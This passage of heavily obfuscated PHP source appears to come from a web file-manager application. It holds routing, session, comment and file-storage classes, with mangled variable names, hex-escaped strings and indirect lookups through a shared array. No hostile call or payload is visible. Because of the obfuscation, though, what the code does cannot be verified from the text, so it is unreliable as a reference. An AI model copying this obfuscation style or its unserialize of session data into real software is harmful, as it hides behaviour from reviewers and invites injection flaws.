$€“ûÚˆ = $this->url($Ï‘²‰â, $å‹±­–, !1); if (substr($Ï‘²‰â, -3) == $ÄÑÃ£ÉÁ[1602]) { echo $ÄÑÃ£ÉÁ[1603] . $€“ûÚˆ . $ÄÑÃ£ÉÁ[1604] . $ÄÑÃ£ÉÁ[206]; } else { if (substr($Ï‘²‰â, -4) == $ÄÑÃ£ÉÁ[1605]) { echo $ÄÑÃ£ÉÁ[1606] . $€“ûÚˆ . $ÄÑÃ£ÉÁ[1607] . $ÄÑÃ£ÉÁ[206]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\171" => "\x5b\x5e\57\135\53", "\72\156\165\x6d" => "\x5b\60\55\71\135\x2b", "\x3a\x61\x6c\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($¼¤ÙÊÉ, $øÃ‹•»Û) { $“ˆÇúšœ =& $_SERVER[–Ú¬çÁ]; if ($¼¤ÙÊÉ == $“ˆÇúšœ[1608]) { $šŠÕØÇÀ = array_map($“ˆÇúšœ[1609], $øÃ‹•»Û[0]); $óíõ™¨† = strpos($øÃ‹•»Û[1], $“ˆÇúšœ[8]) === 0 ? $øÃ‹•»Û[1] : $“ˆÇúšœ[8] . $øÃ‹•»Û[1]; $¬¹à›ô£ = $øÃ‹•»Û[2]; } else { $šŠÕØÇÀ = null; $óíõ™¨† = strpos($øÃ‹•»Û[0], $“ˆÇúšœ[8]) === 0 ? $øÃ‹•»Û[0] : $“ˆÇúšœ[8] . $øÃ‹•»Û[0]; $¬¹à›ô£ = $øÃ‹•»Û[1]; } array_push(self::$maps, $šŠÕØÇÀ); array_push(self::$routes, $óíõ™¨†); array_push(self::$methods, strtoupper($¼¤ÙÊÉ)); array_push(self::$callbacks, $¬¹à›ô£); } public static function error($Ê°Š˜çÓ) { self::$errorCallback = $Ê°Š˜çÓ; } public static function haltOnMatch($ÌÙï¼è¶ = true) { self::$halts = $ÌÙï¼è¶; } public static function dispatch() { $¼ü•Ì«õ =& $_SERVER[–Ú¬çÁ]; $³¡¤…õ = parse_url($_SERVER[$¼ü•Ì«õ[1610]], PHP_URL_PATH); $ìß‚ÄËú = $_SERVER[$¼ü•Ì«õ[160]]; $ŠÊèëäÕ = array_keys(static::$patterns); $¤àöïîë = array_values(static::$patterns); $ªµ²È€½ = !1; self::$routes = preg_replace($¼ü•Ì«õ[1296], $¼ü•Ì«õ[8], self::$routes); if (in_array($³¡¤…õ, self::$routes)) { $Ïôó©ğ— = array_keys(self::$routes, $³¡¤…õ); foreach ($Ïôó©ğ— as $Õáù€ªÅ) { if (self::$methods[$Õáù€ªÅ] == $ìß‚ÄËú || self::$methods[$Õáù€ªÅ] == $¼ü•Ì«õ[1611] || in_array($ìß‚ÄËú, self::$maps[$Õáù€ªÅ])) { $ªµ²È€½ = !0; if (!is_object(self::$callbacks[$Õáù€ªÅ])) { $ş¥ÆËË… = explode($¼ü•Ì«õ[8], self::$callbacks[$Õáù€ªÅ]); $ÁİÚ¼Ñ‚ = end($ş¥ÆËË…); $ÖÊ©İå = explode($¼ü•Ì«õ[1228], $ÁİÚ¼Ñ‚); $éÓ£ëÃş = new $ÖÊ©İå[0](); $éÓ£ëÃş->{$ÖÊ©İå[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Õáù€ªÅ]); if (self::$halts) { return; } } } } } else { $™ÈƒŸÍõ = 0; foreach (self::$routes as $Õáù€ªÅ) { if (strpos($Õáù€ªÅ, $¼ü•Ì«õ[4]) !== !1) { $Õáù€ªÅ = str_replace($ŠÊèëäÕ, $¤àöïîë, $Õáù€ªÅ); } if (preg_match($¼ü•Ì«õ[1612] . $Õáù€ªÅ . $¼ü•Ì«õ[1613], $³¡¤…õ, $ÖÓ¢ë¤›)) { if (self::$methods[$™ÈƒŸÍõ] == $ìß‚ÄËú || self::$methods[$™ÈƒŸÍõ] == $¼ü•Ì«õ[1611] || !empty(self::$maps[$™ÈƒŸÍõ]) && in_array($ìß‚ÄËú, self::$maps[$™ÈƒŸÍõ])) { $ªµ²È€½ = !0; array_shift($ÖÓ¢ë¤›); if (!is_object(self::$callbacks[$™ÈƒŸÍõ])) { $ş¥ÆËË… = explode($¼ü•Ì«õ[8], self::$callbacks[$™ÈƒŸÍõ]); $ÁİÚ¼Ñ‚ = end($ş¥ÆËË…); $ÖÊ©İå = explode($¼ü•Ì«õ[1228], $ÁİÚ¼Ñ‚); $éÓ£ëÃş = new $ÖÊ©İå[0](); if (!method_exists($éÓ£ëÃş, $ÖÊ©İå[1])) { echo $¼ü•Ì«õ[1614]; } else { call_user_func_array(array($éÓ£ëÃş, $ÖÊ©İå[1]), $ÖÓ¢ë¤›); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$™ÈƒŸÍõ], $ÖÓ¢ë¤›); if (self::$halts) { return; } } } } $™ÈƒŸÍõ++; } } if ($ªµ²È€½ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $õ¬–Öº =& $_SERVER[–Ú¬çÁ]; header($_SERVER[$õ¬–Öº[1615]] . $õ¬–Öº[1616]); echo $õ¬–Öº[1617]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$¼ü•Ì«õ[1610]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Ùç‰ûø =& $_SERVER[–Ú¬çÁ]; static $âÃ±æç• = false; if ($âÃ±æç•) { return $âÃ±æç•; } $Ş›Òø¡ = $GLOBALS[$Ùç‰ûø[6]][$Ùç‰ûø[402]]; self::$sessionTime = $Ş›Òø¡[$Ùç‰ûø[1618]]; $ê¹è°Ÿ§ = isset($GLOBALS[$Ùç‰ûø[1619]]) ? $GLOBALS[$Ùç‰ûø[1619]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ê¹è°Ÿ§)) { self::$sessionSign = Cookie::get($ê¹è°Ÿ§); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ê¹è°Ÿ§, self::$sessionSign, self::$sessionTime); $Â§óşÁâ = $Ş›Òø¡[$Ùç‰ûø[1620]]; $Í•¸Ò¿¹ = $Ş›Òø¡[$Â§óşÁâ]; $†ç¥Éì° = $Ş›Òø¡[$Ùç‰ûø[848]]; switch ($Â§óşÁâ) { case $Ùç‰ûø[21]: self::$handle = Model($Ùç‰ûø[849]); break; case $Ùç‰ûø[850]: self::$handle = new CacheRedis($Í•¸Ò¿¹, $†ç¥Éì°); break; case $Ùç‰ûø[851]: self::$handle = new CacheMemcached($Í•¸Ò¿¹, $†ç¥Éì°); break; case $Ùç‰ûø[224]: $Í•¸Ò¿¹[$Ùç‰ûø[84]] = $Í•¸Ò¿¹[$Ùç‰ûø[84]] . $Ùç‰ûø[1621]; self::$handle = new CacheFile($Í•¸Ò¿¹, $†ç¥Éì°); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $âÃ±æç• = new self(); return $âÃ±æç•; } public static function getBySign($ıø‡Ï³ˆ) { $èñéØ›€ = self::$handle->get($ıø‡Ï³ˆ); $èñéØ›€ = unserialize($èñéØ›€); return is_array($èñéØ›€) ? $èñéØ›€ : array(); } public static function setBySign($àó™é‡ğ, $Ó©®¬»£) { CacheLock::lock($àó™é‡ğ); self::$handle->set($àó™é‡ğ, serialize($Ó©®¬»£), self::$sessionTime); CacheLock::unlock($àó™é‡ğ); } public static function sign($Õ—ó™ÕÅ = false) { if ($Õ—ó™ÕÅ) { self::$sessionSign = $Õ—ó™ÕÅ; } self::init(); return self::$sessionSign; } public static function set($üÅÖØ³, $®«È¢Õ” = false) { self::init(); if (is_array($üÅÖØ³)) { foreach ($üÅÖØ³ as $¨éŠ£® => $ÃúÄ˜) { array_set_value(self::$data, $¨éŠ£®, $ÃúÄ˜); } } else { array_set_value(self::$data, $üÅÖØ³, $®«È¢Õ”); } self::setBySign(self::$sessionSign, self::$data); } public static function get($®‘‘óü = false) { self::init(); if (!$®‘‘óü) { return self::$data; } return array_get_value(self::$data, $®‘‘óü); } public static function remove($”½ãÏÙ±) { self::init(); unset(self::$data[$”½ãÏÙ±]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[–Ú¬çÁ][854])) { self::$handle->clearTimeout(); } } } goto EŸ±ê¸¼‰Ü; EÄ‰Ï¯±Æ˜: class CommentModel extends ModelBase { protected $tableName = "\143\157\x6d\155\145\x6e\164"; protected $tableMeta = array("\x74\141\142\154\x65\x4e\x61\x6d\145" => "\x63\x6f\155\155\x65\x6e\164\x5f\x6d\x65\164\x61", "\x6d\x65\164\141\106\151\x65\x6c\x64" => "\x63\x6f\x6d\x6d\x65\156\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($­™†î¯ü) { $´Êåê à =& $_SERVER[–Ú¬çÁ]; if ($­™†î¯ü[$´Êåê à[1893]]) { $¡®ª³„Ó = $this->where(array($´Êåê à[1894] => $­™†î¯ü[$´Êåê à[1893]]))->find(); if (!$¡®ª³„Ó || $¡®ª³„Ó[$´Êåê à[178]] != $­™†î¯ü[$´Êåê à[178]] || $¡®ª³„Ó[$´Êåê à[548]] != $­™†î¯ü[$´Êåê à[548]]) { return !1; } $this->where(array($´Êåê à[1894] => $­™†î¯ü[$´Êåê à[1893]]))->setAdd($´Êåê à[1895], 1); } $­™†î¯ü[$´Êåê à[1896]] = 0; $­™†î¯ü[$´Êåê à[1895]] = 0; $­™†î¯ü[$´Êåê à[770]] = 1; return $this->add($­™†î¯ü); } public function commentCount($®è«ì», $½áìÂÀ, $¤¦û¼Òˆ = false) { $¤©™çé† =& $_SERVER[–Ú¬çÁ]; if (!$®è«ì») { return array(); } if (is_string($®è«ì») || is_int($®è«ì»)) { $®è«ì» = array($®è«ì»); } $ÏÛ™—à« = array($¤©™çé†[548], $¤©™çé†[1897] => $¤©™çé†[543]); $¸íÉ‰öõ = array($¤©™çé†[548] => array($¤©™çé†[7], $®è«ì»), $¤©™çé†[178] => $½áìÂÀ); if ($¤¦û¼Òˆ) { $¸íÉ‰öõ[$¤©™çé†[1666]] = $¤¦û¼Òˆ; } $À¤ÅØ¿ = $this->field($ÏÛ™—à«)->where($¸íÉ‰öõ)->group($¤©™çé†[548])->select(); return array_to_keyvalue($À¤ÅØ¿, $¤©™çé†[548], $¤©™çé†[543]); } public function starTarget($ùï´‘Şş, $¿Í”Ñ”ç) { $è¬êµ¼… =& $_SERVER[–Ú¬çÁ]; $ŒÊ¢ë­Æ = $ùï´‘Şş + self::TYPE_STAR_OFFSET; $º´ÜÃÇÚ = array($è¬êµ¼…[1666] => USER_ID, $è¬êµ¼…[178] => $ŒÊ¢ë­Æ, $è¬êµ¼…[548] => $¿Í”Ñ”ç); $¼È÷ÕŞ† = $this->where($º´ÜÃÇÚ)->find(); if ($¼È÷ÕŞ†) { return $this->where(array($è¬êµ¼…[452] => $¼È÷ÕŞ†[$è¬êµ¼…[452]]))->delete(); } $ÓÊŒ½•Œ = array($è¬êµ¼…[1893] => 0, $è¬êµ¼…[1666] => USER_ID, $è¬êµ¼…[770] => 1, $è¬êµ¼…[774] => $è¬êµ¼…[12], $è¬êµ¼…[178] => $ŒÊ¢ë­Æ, $è¬êµ¼…[548] => $¿Í”Ñ”ç, $è¬êµ¼…[1896] => 0, $è¬êµ¼…[1895] => 0); return $this->add($ÓÊŒ½•Œ); } public function starTargetCount($·²ÅÇÕ, $û‹û´É­) { $»»ßà³ =& $_SERVER[–Ú¬çÁ]; $â›¹Ù‡ = $û‹û´É­ + self::TYPE_STAR_OFFSET; $Îî…ŠÜ = $this->commentCount($·²ÅÇÕ, $â›¹Ù‡); $Èö²«˜  = $this->commentCount($·²ÅÇÕ, $â›¹Ù‡, USER_ID); return array($»»ßà³[1898] => $Îî…ŠÜ, $»»ßà³[1899] => $Èö²«˜ ); } public function starTargetUserList($ğë‡õ“ò, $İÒ†‰‹É) { $š¬¾Ù³» =& $_SERVER[–Ú¬çÁ]; $´Àèâ©® = $ğë‡õ“ò + self::TYPE_STAR_OFFSET; $°ÖÛºÎŠ = array($š¬¾Ù³»[548] => $İÒ†‰‹É, $š¬¾Ù³»[178] => $´Àèâ©®); $µõ™Ÿ’ˆ = $this->where($°ÖÛºÎŠ)->count(); $—ÓÅåû¹ = array($š¬¾Ù³»[308] => $µõ™Ÿ’ˆ, $š¬¾Ù³»[1900] => array()); if (!$µõ™Ÿ’ˆ) { return $—ÓÅåû¹; } $ƒÖËÉ¦é = $this->field($š¬¾Ù³»[1666])->where($°ÖÛºÎŠ)->limit(500)->select(); $ƒÖËÉ¦é = array_to_keyvalue($ƒÖËÉ¦é, $š¬¾Ù³»[12], $š¬¾Ù³»[1666]); $—ÓÅåû¹[$š¬¾Ù³»[1900]] = Model($š¬¾Ù³»[556])->userListInfo($ƒÖËÉ¦é); return $—ÓÅåû¹; } public function prasiseUserList($¨ºÉ›¼“) { $áµ€Êëª =& $_SERVER[–Ú¬çÁ]; $äË£É™Ï = array($áµ€Êëª[1901] => $¨ºÉ›¼“); $…í‹”¼¯ = $this->where($äË£É™Ï)->find(); $›ä¸Æ¹‹ = _get($…í‹”¼¯, $áµ€Êëª[1896], 0); $êëµ‡ß = array($áµ€Êëª[308] => $›ä¸Æ¹‹, $áµ€Êëª[1900] => array()); if (!$›ä¸Æ¹‹) { return $êëµ‡ß; } $”ÓÜç’Ã = Model($áµ€Êëª[1902])->field($áµ€Êëª[1666])->where($äË£É™Ï)->limit(500)->select(); $”ÓÜç’Ã = array_to_keyvalue($”ÓÜç’Ã, $áµ€Êëª[12], $áµ€Êëª[1666]); $êëµ‡ß[$áµ€Êëª[1900]] = Model($áµ€Êëª[556])->userListInfo($”ÓÜç’Ã); return $êëµ‡ß; } public function remove($Ğ˜÷µûæ) { $»—‹ÑÍ› =& $_SERVER[–Ú¬çÁ]; $²‹ºî‘› = array($»—‹ÑÍ›[1894] => $Ğ˜÷µûæ); $ÂĞ†ÖğÄ = $this->where($²‹ºî‘›)->find(); if ($ÂĞ†ÖğÄ[$»—‹ÑÍ›[1893]]) { $this->where(array($»—‹ÑÍ›[1894] => $ÂĞ†ÖğÄ[$»—‹ÑÍ›[1893]]))->setAdd($»—‹ÑÍ›[1895], -1); } return $this->where($²‹ºî‘›)->delete(); } public function edit($³‰Á‰¸€, $‡”‰‹åÖ) { $éî†»éÉ =& $_SERVER[–Ú¬çÁ]; $èÁŞîíˆ = array($éî†»éÉ[1894] => $³‰Á‰¸€); return $this->where($èÁŞîíˆ)->save(array($éî†»éÉ[1903] => $‡”‰‹åÖ)); } public function prasise($°åöœÖ®) { $Ş¹Ó°Ë¯ =& $_SERVER[–Ú¬çÁ]; $Ş£ş¯´Æ = Model($Ş¹Ó°Ë¯[1904]); $ìØ–±Ÿ¦ = array($Ş¹Ó°Ë¯[1894] => $°åöœÖ®, $Ş¹Ó°Ë¯[1657] => USER_ID); $ïºö“„ù = $Ş£ş¯´Æ->where($ìØ–±Ÿ¦)->find(); if (!$ïºö“„ù) { $Ş£ş¯´Æ->add($ìØ–±Ÿ¦); $¡Æ‡Ä“Ï = $this->where(array($Ş¹Ó°Ë¯[1894] => $°åöœÖ®))->setAdd($Ş¹Ó°Ë¯[1896], 1); } else { $Ş£ş¯´Æ->where($ìØ–±Ÿ¦)->delete(); $¡Æ‡Ä“Ï = $this->where(array($Ş¹Ó°Ë¯[1894] => $°åöœÖ®))->setAdd($Ş¹Ó°Ë¯[1896], -1); } return $¡Æ‡Ä“Ï; } public function targetInfo($ÇÙ®—ƒ÷, $¯³¨ÁÙ“) { $şÕãıÇİ =& $_SERVER[–Ú¬çÁ]; $ş­ŞÙö = array($şÕãıÇİ[626] => $ÇÙ®—ƒ÷, $şÕãıÇİ[627] => $¯³¨ÁÙ“); $·ÇéŸ£¾ = $this->where($ş­ŞÙö)->count(); $Ú³¢ŸÂÎ = "\122\x49\107\110\x54\x20\112\117\111\x4e\40{$this->tablePrefix}\143\157\155\x6d\145\x6e\164\x5f\160\162\141\151\163\145\x20\163\x74\x61\x72\x20\157\156\x20\143\157\x6d\155\x65\x6e\164\x2e\x63\157\x6d\155\x65\156\164\x49\x44\40\x3d\40\x73\x74\141\x72\x2e\x63\x6f\x6d\155\x65\156\x74\x49\x44"; $»’¾ß´ = $this->alias($şÕãıÇİ[407])->where($ş­ŞÙö)->join($Ú³¢ŸÂÎ, $şÕãıÇİ[1905])->count(); $×¢Ìò¤ç = array($şÕãıÇİ[1906] => $·ÇéŸ£¾, $şÕãıÇİ[1907] => $»’¾ß´); return $×¢Ìò¤ç; } public function listData($Ä—³ç™¼) { $×ú™ÛÇã =& $_SERVER[–Ú¬çÁ]; if (isset($Ä—³ç™¼[$×ú™ÛÇã[1908]])) { if ($Ä—³ç™¼[$×ú™ÛÇã[1908]]) { $Ä—³ç™¼[$×ú™ÛÇã[1901]] = array($×ú™ÛÇã[1034], intval($Ä—³ç™¼[$×ú™ÛÇã[1908]])); } unset($Ä—³ç™¼[$×ú™ÛÇã[1908]]); } if (isset($Ä—³ç™¼[$×ú™ÛÇã[1909]])) { if ($Ä—³ç™¼[$×ú™ÛÇã[1909]]) { $Ä—³ç™¼[$×ú™ÛÇã[1901]] = array($×ú™ÛÇã[1031], intval($Ä—³ç™¼[$×ú™ÛÇã[1909]])); } unset($Ä—³ç™¼[$×ú™ÛÇã[1909]]); } return $this->_listData($Ä—³ç™¼); } private function _listData($èåÕÑ¬±) { $š°€Ñ¼ã =& $_SERVER[–Ú¬çÁ]; $¸É«œŸË = $this->where($èåÕÑ¬±)->_makeOrder()->selectPage(100); $this->_listAppendParent($¸É«œŸË[$š°€Ñ¼ã[422]]); $this->_listAppendUser($¸É«œŸË[$š°€Ñ¼ã[422]]); $this->_listAppendMeta($¸É«œŸË[$š°€Ñ¼ã[422]]); return $¸É«œŸË; } private function _makeOrder() { $¥¬‡É =& $_SERVER[–Ú¬çÁ]; $‹ ×“‡ı = array($¥¬‡É[1896], $¥¬‡É[1895], $¥¬‡É[225]); $ƒ„€ÎÄŒ = Input::get($¥¬‡É[507], $¥¬‡É[7], $¥¬‡É[474], $‹ ×“‡ı); $£Å÷óÅ½ = Input::get($¥¬‡É[508], $¥¬‡É[7], $¥¬‡É[1659], array($¥¬‡É[1910], $¥¬‡É[503])); $ïİá€Ë = $ƒ„€ÎÄŒ . $¥¬‡É[53] . $£Å÷óÅ½; return $this->order($ïİá€Ë); } private function _listAppendParent(&$ Ğ³Ø§) { $¬ã››ù =& $_SERVER[–Ú¬çÁ]; $½àÓÀŒÏ = array_unique(array_to_keyvalue($ Ğ³Ø§, $¬ã››ù[12], $¬ã››ù[1893])); $½àÓÀŒÏ = array_remove_value($½àÓÀŒÏ, $¬ã››ù[222]); if (!$½àÓÀŒÏ) { return; } $¶ıÚæ¿ù = $this->where(array($¬ã››ù[1894] => array($¬ã››ù[7], $½àÓÀŒÏ)))->select(); $¶ıÚæ¿ù = array_to_keyvalue($¶ıÚæ¿ù, $¬ã››ù[1901]); foreach ($ Ğ³Ø§ as &$—ù™æ¯Ê) { if (isset($¶ıÚæ¿ù[$—ù™æ¯Ê[$¬ã››ù[1893]]])) { $—ù™æ¯Ê[$¬ã››ù[1911]] = $¶ıÚæ¿ù[$—ù™æ¯Ê[$¬ã››ù[1893]]]; } } unset($—ù™æ¯Ê); } private function _listAppendUser(&$ÒÅ£‘Ó’) { $¡óÕ¯»¶ =& $_SERVER[–Ú¬çÁ]; $×÷ÜîÍ¯ = array_unique(array_to_keyvalue($ÒÅ£‘Ó’, $¡óÕ¯»¶[12], $¡óÕ¯»¶[1666])); $×÷ÜîÍ¯ = array_remove_value($×÷ÜîÍ¯, $¡óÕ¯»¶[222]); if (count($×÷ÜîÍ¯) == 0) { return; } foreach ($ÒÅ£‘Ó’ as $´ÎúÏı) { if (isset($´ÎúÏı[$¡óÕ¯»¶[1911]])) { $×÷ÜîÍ¯[] = $´ÎúÏı[$¡óÕ¯»¶[1911]][$¡óÕ¯»¶[1666]]; } } $åÓ™’ = Model($¡óÕ¯»¶[577])->userListInfo($×÷ÜîÍ¯); foreach ($ÒÅ£‘Ó’ as &$´ÎúÏı) { $´ÎúÏı[$¡óÕ¯»¶[640]] = $åÓ™’[$´ÎúÏı[$¡óÕ¯»¶[1666]]]; if (isset($´ÎúÏı[$¡óÕ¯»¶[1911]])) { $´ÎúÏı[$¡óÕ¯»¶[1911]][$¡óÕ¯»¶[640]] = $åÓ™’[$´ÎúÏı[$¡óÕ¯»¶[1911]][$¡óÕ¯»¶[1666]]]; } } unset($´ÎúÏı); } private function _listAppendMeta(&$¶•ˆ•ó) { $á™§¶ÖÚ =& $_SERVER[–Ú¬çÁ]; $¨«ùŞˆ¢ = array_unique(array_to_keyvalue($¶•ˆ•ó, $á™§¶ÖÚ[12], $á™§¶ÖÚ[1901])); $¨«ùŞˆ¢ = array_remove_value($¨«ùŞˆ¢, $á™§¶ÖÚ[222]); if (!$¨«ùŞˆ¢) { return; } foreach ($¶•ˆ•ó as $×Ú¸¨âĞ) { if (isset($×Ú¸¨âĞ[$á™§¶ÖÚ[1911]])) { $¨«ùŞˆ¢[] = $×Ú¸¨âĞ[$á™§¶ÖÚ[1911]][$á™§¶ÖÚ[1901]]; } } $Ü˜ ÍÓš = $this->metaList($¨«ùŞˆ¢); if (!$Ü˜ ÍÓš) { return !1; } foreach ($¶•ˆ•ó as &$×Ú¸¨âĞ) { $×Ú¸¨âĞ[$á™§¶ÖÚ[516]] = $Ü˜ ÍÓš[$×Ú¸¨âĞ[$á™§¶ÖÚ[1901]]]; if (isset($×Ú¸¨âĞ[$á™§¶ÖÚ[1911]])) { $×Ú¸¨âĞ[$á™§¶ÖÚ[1911]][$á™§¶ÖÚ[516]] = $Ü˜ ÍÓš[$×Ú¸¨âĞ[$á™§¶ÖÚ[1911]][$á™§¶ÖÚ[1901]]]; } } unset($×Ú¸¨âĞ); } private function metaList($’ª÷­äÄ) { $ÀñçµéÂ =& $_SERVER[–Ú¬çÁ]; if (!$’ª÷­äÄ) { return array(); } $ü§Å¢´¿ = array($ÀñçµéÂ[1901] => array($ÀñçµéÂ[7], $’ª÷­äÄ)); $óè‚æèë = Model($ÀñçµéÂ[1912])->where($ü§Å¢´¿)->select(); $óè‚æèë = array_to_keyvalue_group($óè‚æèë, $ÀñçµéÂ[1901]); foreach ($óè‚æèë as $â¹àå…§ => $—Ğ¢·«á) { $È”ùæ Ï = array(); foreach ($—Ğ¢·«á as $‘Æğ¡•Œ) { $È”ùæ Ï[$‘Æğ¡•Œ[$ÀñçµéÂ[94]]] = $‘Æğ¡•Œ[$ÀñçµéÂ[427]]; } $óè‚æèë[$â¹àå…§] = $È”ùæ Ï; } return $óè‚æèë ? $óè‚æèë : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\x6c\145\x5f\x63\157\x6e\x74\145\x6e\x74\163"; protected $dataAuto = array(array("\x63\x72\145\141\x74\145\124\151\155\x65", "\x74\151\x6d\x65", "\x69\156\x73\145\162\x74", "\146\165\156\143\164\x69\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\x69\154\x65"; protected $tableMeta = array("\164\141\x62\154\x65\116\x61\155\x65" => "\x69\x6f\x5f\x66\151\x6c\x65\137\x6d\x65\x74\x61", "\x6d\x65\x74\x61\106\x69\x65\154\x64" => "\x66\x69\154\x65\x49\x44"); public function fileInfo($´Öõ¨Ú¯) { $ÖÉ¤”š¡ =& $_SERVER[–Ú¬çÁ]; static $ò÷ÅÓ‰¬ = array(); if (!isset($ò÷ÅÓ‰¬[$´Öõ¨Ú¯])) { $ÍÎóœ”Ø = $ÖÉ¤”š¡[1913]; $´àİë» = Model($ÖÉ¤”š¡[521])->field($ÍÎóœ”Ø)->where(array($ÖÉ¤”š¡[519] => $´Öõ¨Ú¯))->find(); $ò÷ÅÓ‰¬[$´Öõ¨Ú¯] = $´àİë»; } return $ò÷ÅÓ‰¬[$´Öõ¨Ú¯]; } public function addFileByContent($ø´èüÌ = '', $Ë¤Öäˆ = '') { $‰İıÈ¤ =& $_SERVER[–Ú¬çÁ]; $¿‡ßşª = TEMP_PATH . $‰İıÈ¤[1914]; if (!is_dir($¿‡ßşª)) { mk_dir($¿‡ßşª); } $ş¡”Ò£á = $¿‡ßşª . $‰İıÈ¤[1915] . rand_string(16); file_put_contents($ş¡”Ò£á, $ø´èüÌ); $éÃè†Ñå = $this->addFile($ş¡”Ò£á, $Ë¤Öäˆ, !0); if (file_exists($ş¡”Ò£á)) { @unlink($ş¡”Ò£á); } return $éÃè†Ñå; } public function createFileName($ªß™ÖÔ, $…‹Ğ…¡ë = false, $ßå½ùø = false) { $ÖåÎ…î× =& $_SERVER[–Ú¬çÁ]; $¦×­‡íª = IO::init($ÖåÎ…î×[8]); $¥¶°˜«œ = $this->makeFilePath($ªß™ÖÔ, $¦×­‡íª, $…‹Ğ…¡ë, $ßå½ùø); $¼ÒâåŸ = $¦×­‡íª->pathFather($¥¶°˜«œ); static $İ’æ²‡ë = false; $Õ½ÛßÖ = $ÖåÎ…î×[1916] . md5($¼ÒâåŸ); if (!$İ’æ²‡ë && !Cache::get($Õ½ÛßÖ)) { $İ’æ²‡ë = !0; $©½À©Ô’ = IO::mkdir($¼ÒâåŸ); if (!IO::exist($©½À©Ô’ . $ÖåÎ…î×[817])) { IO::mkfile($©½À©Ô’ . $ÖåÎ…î×[817]); } Cache::set($Õ½ÛßÖ, 1, 3600 * 2); } return $¥¶°˜«œ; } public function makeFilePath($¦“š›‡â, $µÅÜ“”§, $©õÀƒ› = false, $à®µÕ = false) { $“ºû‘ö =& $_SERVER[–Ú¬çÁ]; $óäê»Æ¡ = Model($“ºû‘ö[790])->get($“ºû‘ö[1917]); $®¿»óîÛ = KodIO::defaultIO() . date($“ºû‘ö[1918]); $©®ÀíÖ = $®¿»óîÛ . rand_string(5) . short_id(100); $¦“š›‡â = str_replace($“ºû‘ö[8], $“ºû‘ö[11], KodIO::clear($¦“š›‡â)); $´åŞ¤Ûø = $µÅÜ“”§->ext($¦“š›‡â); if (!$¦“š›‡â) { $óäê»Æ¡ = $“ºû‘ö[1919]; } switch ($óäê»Æ¡) { case $“ºû‘ö[1920]: $©®ÀíÖ = $©®ÀíÖ . $“ºû‘ö[10] . $µÅÜ“”§->ext($¦“š›‡â); if ($´åŞ¤Ûø == $“ºû‘ö[1857]) { $©®ÀíÖ .= $“ºû‘ö[1226]; } break; case $“ºû‘ö[1921]: $êüøŠ¤¡ = Model($“ºû‘ö[790])->get($“ºû‘ö[791]); $İ“Ù¹¢• = substr(md5($“ºû‘ö[792] . $êüøŠ¤¡ . date($“ºû‘ö[768])), 0, 8); $ô¸Õó–í = KodIO::defaultDriver(); $®¿»óîÛ = $“ºû‘ö[1257] . $ô¸Õó–í[$“ºû‘ö[452]] . $“ºû‘ö[461] . date($“ºû‘ö[1922]) . $İ“Ù¹¢• . $“ºû‘ö[8]; if ($´åŞ¤Ûø == $“ºû‘ö[1857]) { $¦“š›‡â .= $“ºû‘ö[1226]; } $³å¹ÏÉ = $“ºû‘ö[1923] . $®¿»óîÛ . $¦“š›‡â; CacheLock::lock($³å¹ÏÉ); $©®ÀíÖ = $®¿»óîÛ . $¦“š›‡â; if (IO::exist($®¿»óîÛ . $¦“š›‡â)) { $ÖêÙß÷ = substr($¦“š›‡â, 0, strlen($¦“š›‡â) - strlen($´åŞ¤Ûø)); $ğ¼µóÂÅ = $à®µÕ ? substr($à®µÕ, 0, 5) : ($©õÀƒ› ? substr($©õÀƒ›, 0, 5) : rand_string(5)); $©®ÀíÖ = $®¿»óîÛ . $ÖêÙß÷ . $ğ¼µóÂÅ . $“ºû‘ö[10] . $´åŞ¤Ûø; } if (IO::isTypeObject($©®ÀíÖ) && !IO::isUploadServer($©®ÀíÖ)) { if (IO::exist($©®ÀíÖ)) { return $©®ÀíÖ; } $Ãçâ‚· = IO::setContent($©®ÀíÖ, $“ºû‘ö[12]); if (!$Ãçâ‚·) { show_json($“ºû‘ö[1924], !1); } } CacheLock::unlock($³å¹ÏÉ); break; case $“ºû‘ö[1919]: break; default: break; } return $©®ÀíÖ; } public function addFileByRemote($˜îŒê¥¸, $ô‘ëÕõ, $å¼„…ëø = array()) { $ûÇœåÀ =& $_SERVER[–Ú¬çÁ]; if (!IO::exist($˜îŒê¥¸)) { return !1; } $Û¹Áéşø = $å¼„…ëø[$ûÇœåÀ[524]] ? $å¼„…ëø[$ûÇœåÀ[524]] : $ûÇœåÀ[12]; $Î²Æ“ÈÌ = IO::hashMd5($˜îŒê¥¸, $Û¹Áéşø); $ßğôÕ˜ = KodIO::defaultDriver(); $ˆÏ·Í¿½ = array($ûÇœåÀ[595] => IO::size($˜îŒê¥¸), $ûÇœåÀ[1925] => 1, $ûÇœåÀ[471] => $ô‘ëÕõ, $ûÇœåÀ[828] => $ßğôÕ˜[$ûÇœåÀ[452]], $ûÇœåÀ[472] => $˜îŒê¥¸, $ûÇœåÀ[1926] => $å¼„…ëø[$ûÇœåÀ[650]] ? 